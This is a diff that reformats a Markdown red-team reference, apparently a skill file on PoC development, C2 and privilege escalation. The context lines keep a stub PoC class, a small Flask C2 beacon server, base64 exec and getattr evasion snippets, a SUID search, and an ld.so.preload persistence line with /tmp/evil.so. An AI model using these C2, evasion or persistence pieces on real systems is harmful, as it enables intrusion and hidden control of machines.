@@ -27,15 +27,21 @@ description: 红队攻击技术。PoC开发、C2框架、横向移动、权限�
 import requests
 import argparse
 
+
 class POC:
-    def __init__(self, target: str):
+    def __init__(
+            self,
+            target: str
+    ):
         self.target = target.rstrip('/')
         self.session = requests.Session()
         self.session.headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
         }
 
-    def check(self) -> bool:
+    def check(
+            self
+    ) -> bool:
         """无害检测"""
         try:
             # 使用延时、DNS外带等无害方式验证
@@ -43,9 +49,13 @@ class POC:
         except Exception as e:
             return False
 
-    def exploit(self, cmd: str) -> str:
+    def exploit(
+            self,
+            cmd: str
+    ) -> str:
         """漏洞利用"""
         pass
+
 
 def main():
     parser = argparse.ArgumentParser()
@@ -59,6 +69,7 @@ def main():
         print(poc.exploit(args.cmd))
     else:
         print("[-] Not vulnerable")
+
 
 if __name__ == '__main__':
     main()
@@ -117,14 +128,20 @@ import base64
 app = Flask(__name__)
 agents, tasks = {}, {}
 
+
 @app.route('/beacon/<agent_id>')
-def beacon(agent_id):
+def beacon(
+        agent_id
+):
     if tasks.get(agent_id):
         return jsonify({"task": tasks[agent_id].pop(0)})
     return jsonify({"task": None})
 
+
 @app.route('/result/<agent_id>', methods=['POST'])
-def result(agent_id):
+def result(
+        agent_id
+):
     output = base64.b64decode(request.json['output']).decode()
     print(f"[{agent_id}] {output}")
     return jsonify({"status": "ok"})
@@ -241,11 +258,13 @@ find / -perm -4000 2>/dev/null
 ```python
 # 1. 字符串混淆
 import base64
+
 payload = base64.b64encode(b"malicious_code").decode()
 exec(base64.b64decode(payload))
 
 # 2. 动态加载
 import importlib
+
 module = importlib.import_module("os")
 getattr(module, "system")("whoami")
 
@@ -328,7 +347,7 @@ echo "/tmp/evil.so" >> /etc/ld.so.preload
 ## 工具清单
 
 | 工具          | 用途             |
-|---------------|------------------|
+| ------------- | ---------------- |
 | Sliver        | 开源 C2 框架     |
 | Metasploit    | 渗透测试框架     |
 | Cobalt Strike | 商业 C2          |
@@ -349,7 +368,7 @@ echo "/tmp/evil.so" >> /etc/ld.so.preload
 ```
 
 | 阶段   | 攻击方式   | 示例                       |
-|--------|------------|----------------------------|
+| ------ | ---------- | -------------------------- |
 | 源代码 | 依赖投毒   | event-stream、ua-parser-js |
 | 构建   | CI/CD 劫持 | SolarWinds、CodeCov        |
 | 制品   | 恶意包     | PyPI/npm 钓鱼包            |
